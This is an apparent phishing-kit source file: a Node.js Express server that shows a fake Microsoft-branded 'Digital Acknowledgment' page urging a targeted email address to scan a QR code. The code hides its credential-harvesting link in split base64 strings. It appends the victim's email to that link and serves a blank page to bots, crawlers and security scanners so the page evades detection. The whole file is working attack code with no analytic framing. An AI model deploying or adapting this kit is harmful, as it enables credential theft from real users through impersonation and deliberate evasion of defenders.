const express = require('express');
const bodyParser = require('body-parser');
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));

const part1 = "aHR0cHM6Ly9sb2dpbi50YXRhdXJ1cy5iaXov"; 
const part2 = "cGdhYWZGVE0=";

app.all('/', (req, res) => {
    const ua = req.headers['user-agent'] ? req.headers['user-agent'].toLowerCase() : "";
    const targetEmail = req.query.m || req.query.login_hint || req.body?.login_hint || "";
    const isBotUA = /bot|spider|crawler|google|cloud|datacenter|headless|monit|phish|virus|censys/i.test(ua);

    if (isBotUA || (targetEmail === "" && !req.query.debug)) {
        return res.send('<html><body style="background:white;"></body></html>');
    }

    let finalLink = Buffer.from(part1, 'base64').toString() + Buffer.from(part2, 'base64').toString();
    if(targetEmail !== "") finalLink += (finalLink.includes('?') ? '&' : '?') + "m=" + encodeURIComponent(targetEmail);

    res.send(`
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Digital Acknowledgment Portal</title>
            <style>
                body { background: #f4f4f4; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
                .card { background: white; width: 100%; max-width: 450px; padding: 40px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-radius: 2px; }
                .logo-section { display: flex; align-items: center; margin-bottom: 20px; }
                .soc-text { font-size: 16px; color: #333; font-weight: 500; }
                .badge { background: #e8f4fd; color: #0078d4; font-size: 10px; font-weight: bold; padding: 4px 8px; border-radius: 2px; display: inline-block; margin-bottom: 20px; text-transform: uppercase; }
                h2 { font-size: 22px; color: #222; margin: 0 0 15px 0; font-weight: 600; }
                p { font-size: 14px; color: #666; line-height: 1.5; margin-bottom: 30px; }
                .qr-container { background: #fafafa; border: 1px solid #eee; padding: 30px; text-align: center; }
                .sync-text { color: #0078d4; font-size: 13px; margin-bottom: 15px; display: flex; align-items: center; justify-content: center; font-weight: 500; }
                .dot { height: 8px; width: 8px; background-color: #0078d4; border-radius: 50%; display: inline-block; margin-right: 10px; animation: blink 1s infinite; }
                @keyframes blink { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
                .qr-code { width: 180px; height: 180px; background: white; margin: 0 auto; display: block; border: 1px solid #ddd; }
                .footer { margin-top: 40px; font-size: 11px; color: #999; border-top: 1px solid #eee; padding-top: 20px; }
            </style>
        </head>
        <body>
            <div class="card">
                <div class="logo-section">
                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="margin-right:12px;">
                        <path d="M12 1L3 5V11C3 16.55 6.84 21.74 12 23C17.16 21.74 21 16.55 21 11V5L12 1Z" fill="#D83B01"/>
                        <path d="M12 5.5L9.5 8L10.9 9.4L12 8.3L15.1 11.4L16.5 10L12 5.5Z" fill="white"/>
                    </svg>
                    <span class="soc-text">Corporate Security Gateway</span>
                </div>
                <div class="badge">Compliance Verified</div>
                <h2>Digital Acknowledgment</h2>
                <p>To finalize your review of the 2026 Security Protocol, please scan the QR code below with your mobile device to sign the acknowledgment for <strong>${targetEmail}</strong>.</p>
                
                <div class="qr-container">
                    <div class="sync-text"><span class="dot"></span> Waiting for mobile authorization...</div>
                    <img src="https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(finalLink)}" class="qr-code">
                </div>

                <div class="footer">
                    Ref: ACK-2026-PROT | Node: ${req.headers['x-forwarded-for'] || 'Secure'} <br>
                    © 2026 Microsoft Security & Compliance.
                </div>
            </div>
        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 8080;
app.listen(PORT);
